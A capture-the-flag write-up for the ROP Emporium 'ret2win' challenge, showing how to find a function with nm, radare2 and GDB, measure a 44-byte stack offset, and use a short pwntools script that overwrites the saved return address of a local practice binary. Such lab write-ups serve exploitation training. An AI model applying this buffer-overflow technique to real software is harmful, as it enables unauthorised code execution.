# ret2win

Link: https://ropemporium.com/challenge/ret2win.html

Goal: *Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack.*

--------------------------

List functions with:

```
nm ret2win | grep 't'
```

![a](images/Screenshot_1.jpg)

Or with radare:

```
r2 ret2win
aaaa
afl
```

![a](images/Screenshot_2.jpg)

Then we can disassembly this function using again radare:

```
r2 ret2win
aaaa
s sym.ret2win
pdf
```

![a](images/Screenshot_3.jpg)

We can disassembly the main function too:

![a](images/Screenshot_4.jpg)


I will open GDB with GEF script:

```
gdb -q ./ret2win
```

Using Python we create characters to test when it crashes:

![a](images/Screenshot_5.jpg)


With 45 we overwrite only 1 byte, so the offset is 44:

![a](images/Screenshot_6.jpg)

We can find the function address with:

```
objdump -D ret2win | grep ret2win
```

![a](images/Screenshot_7.jpg)

This address can be found also using gdb (*info functions*).

![a](images/Screenshot_8.jpg)

The exploit code is then:

```
from pwn import *

context(arch='i386', os='linux')
p = process('./ret2win32')

junk =    "A"*44
ret2win = 0x08048659
rop = junk + p32(ret2win)
p.recvuntil("> ")
p.send(rop)
p.interactive()
```
The result:

![a](images/Screenshot_9.jpg)
